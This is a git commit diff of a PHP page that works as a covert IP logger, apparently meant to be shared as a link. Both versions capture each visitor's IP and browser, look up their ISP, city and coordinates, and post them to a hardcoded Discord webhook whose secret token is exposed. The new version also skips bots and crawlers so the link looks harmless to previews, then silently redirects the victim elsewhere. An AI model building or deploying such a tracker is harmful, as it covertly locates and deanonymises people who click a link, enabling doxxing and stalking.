a5b3fd51867c8fe60b634fba56e739eb05cfbe25
bunkerexplorer <lifeofbutter@gmail.com>
2021-08-27 19:35:59 -0400

    idc who sees this im messing around
    cope

--- index.php
+++ index.php
@@ -1,32 +1,52 @@
 <?php
-//======PUT YOUR DISCORD WEBHOOK HERE (RECCOMENDED: MAKE THE CHANNEL SO YOU CAN SEE IT ONLY)========\\
-$webhookurl = "https://discord.com/api/webhooks/880935736277364756/K0P0rZmTBDCQgsML_ofBRmCVPr1lTZbD9nYs7DPlbkMYFCgGiBUGlc6PEtWBi97SInk0";
 
-//===========IP TO LOCATION & TIME/DATE INFORMATION PULLED BY THE HOSTING SERVER ====================\\
-$ip = $_SERVER['REMOTE_ADDR'];
-$browser = $_SERVER['HTTP_USER_AGENT'];
-$TheirDate = date('d/m/Y');
-$TheirTime = date('G:i:s');
-$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
-$flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
-$data = "**User IP:** $ip\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip";
+//Get the IP & Info
+$IP       = $_SERVER['REMOTE_ADDR'];
+$Browser  = $_SERVER['HTTP_USER_AGENT'];
+
+//Stop us from picking up bot ips
+if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
+    exit();
+}
+
+//Info
+$Curl = curl_init("http://ip-api.com/json/$IP"); //Get the info of the IP using Curl
+curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+$Info = json_decode(curl_exec($Curl)); 
+curl_close($Curl);
+
+$ISP = $Info->isp;
+$Country = $Info->country;
+$Region = $Info->regionName;
+$City = $Info->city;
+$COORD = "$Info->lat, $Info->lon"; // Coordinates
+
+//Variables
+$Webhook    = "https://discord.com/api/webhooks/880935736277364756/K0P0rZmTBDCQgsML_ofBRmCVPr1lTZbD9nYs7DPlbkMYFCgGiBUGlc6PEtWBi97SInk0"; //Webhook here.
+
+$WebhookTag = "Test"; //This will be the name of the webhook when it sends a message.  
+
+//JS we are going to send to the webhook.
+$JS = array(
+    'username'   => "$WebhookTag - IP Logger" , 
+    'avatar_url' => "https://vgy.me/GQe9bJ.png",
+    'content'    => "**__IP Info__**:\nIP: $IP\nISP: $ISP\nBrowser: $Browser\n**__Location__**: \nCountry: $Country\nRegion: $Region\nCity: $City\nCoordinates: $COORD"
+);
+ 
+//Encode that JS so we can post it to the webhook
+$JSON = json_encode($JS);
 
 
+function IpToWebhook($Hook, $Content)
+{
+    //Use Curl to post to the webhook.
+      $Curl = curl_init($Hook);
+      curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
+      curl_setopt($Curl, CURLOPT_POSTFIELDS, $Content);
+      curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+      return curl_exec($Curl);
+}
 
-
-//=====================================DISCORD PHP BOT STUFF=========================================\\
-$json_data = array ('content'=>"$data", 'username'=>"New Visitor From $details->country", 'avatar_url'=> "$flag");
-$make_json = json_encode($json_data);
-$ch = curl_init( $webhookurl );
-
-//==================CURL OPTIONS FOR POSTING THE INFORMATION PROVIDED ABOVE ==========================\\
-curl_setopt( $ch, CURLOPT_POST, 1);
-curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
-curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt( $ch, CURLOPT_HEADER, 0);
-curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
-
-//===============THIS OUTPUTS THE CHANNEL SET BY THE WEBHOOK ==========================================\\
-$response = curl_exec( $ch );
-
+IpToWebhook($Webhook, $JSON);
+header("Location: https://www.littest.site");
 ?>
